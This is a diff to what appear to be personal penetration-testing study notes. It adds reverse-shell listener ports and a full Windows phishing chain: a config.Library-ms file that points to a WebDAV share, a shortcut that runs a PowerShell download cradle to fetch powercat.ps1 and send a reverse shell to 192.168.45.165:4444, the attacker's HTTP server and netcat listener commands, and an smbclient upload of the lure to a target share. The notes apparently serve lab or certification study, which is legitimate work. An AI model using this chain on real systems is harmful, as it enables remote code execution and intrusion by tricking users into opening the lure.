@@ -64,6 +64,8 @@
     - aspx: cmdasp.aspx
     - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
     - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+  - Kali port: 4444 (reverse shell), 8080 (burp suite), 8888 (WebDAV shared), 8000 (Powercat/Python), 9001 (alternative to 4444 various reverse shell listeners)  
+  - Target port: 22 (ssh), 21 (ftp), 80 (http), 3389 (RDP), 
   - File transfer
     - windows <> Kali
       ```
@@ -440,8 +442,47 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   `mkdir ~/share`
 - Start WsgiDAV server
   `wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share`
-- On RDP Windows Machine > Right click PC > Map Network Drive  > `http://<KALI>:8888/`  
+- On RDP Windows Machine > Right click PC > Map Network Drive  > `http://<KALI>:8888/`
 
+**Create config.Library-ms**
+- Windows Library file used as part of a local file execution or WebDAV attack to achieve arbitrary code execution or remote file retrieval
+- Visual Studio Core > New File > Save as 'config.Library-ms'
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.165</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+- Open the config > WebDAV shared folder appear
+
+**Create ShortCut > PowerShell Download Cradle and PowerCat Reverse Shell Execution**  
+- Right click desktop short cut > location `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.165:8000/powercat.ps1'); powercat -c 192.168.45.165 -p 4444 -e powershell"` >  name: automatic_configuration
+- Kali start Python3 web server on port 8000 where powercat.ps1 is located and start a netcat listener on port 4444
+  `cd /usr/share/powershell-empire/empire/server/data/module_source/management`
+  `python3 -m http.server 8000`
+  `nc -nvlp 4444`
+
+**Copy the automatic_configuration.lnk and config.Library-ms to our WebDAV directory on our Kali machine** 
+- Obtain a reverse shell from target machine**  
+- Upload our library fiiles to the SMB share on the target machine
+- On kali cd webdav > `smbclient //192.168.158.199/share -c 'put config.Library-ms'` (target machine IP)
+  
+**User open the file and Incoming reverse shell from target machine `PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami`**
   
 ### 13. Locating public exploits  
 - An exploit is a program or script that can leverage a flaw or vulnerability of a target system. E.g DoS, RCE, privilege escalation.
